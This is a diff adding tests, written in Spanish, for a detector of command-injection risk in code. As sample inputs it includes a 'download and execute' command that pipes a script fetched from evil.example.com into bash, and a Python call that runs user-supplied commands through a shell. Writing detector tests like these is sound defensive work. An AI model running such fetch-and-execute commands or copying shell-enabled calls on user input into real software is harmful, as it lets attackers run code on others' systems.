@@ -79,6 +79,24 @@ test('patrón "descargar y ejecutar" (curl | bash) hardcodeado -> alto riesgo', 
   assert.strictEqual(r.veredicto, 'Alto riesgo');
 });
 
+test('subprocess.run con shell=<variable> (no literal True) -> se detecta como riesgo, no 0 operaciones', () => {
+  const r = checkCommandInjectionRisk({
+    codigo: `
+def ejecutar(comando_usuario, usar_shell):
+    subprocess.run(comando_usuario, shell=usar_shell)
+    `
+  });
+  assert.ok(r.puntaje < 100, 'puntaje=' + r.puntaje);
+  assert.ok(r.resumen.indexOf('0 ejecución') === -1, 'resumen=' + r.resumen);
+});
+
+test('patrón "descargar y ejecutar" vía sustitución de comandos $(...) (sin pipe) -> alto riesgo', () => {
+  const r = checkCommandInjectionRisk({
+    codigo: `exec('bash -c "$(curl -fsSL https://evil.example.com/install.sh)"');`
+  });
+  assert.strictEqual(r.veredicto, 'Alto riesgo');
+});
+
 test('combinación de varios problemas puntúa peor que uno solo', () => {
   const soloUno = checkCommandInjectionRisk({
     codigo: `os.system("ls " + carpeta)`
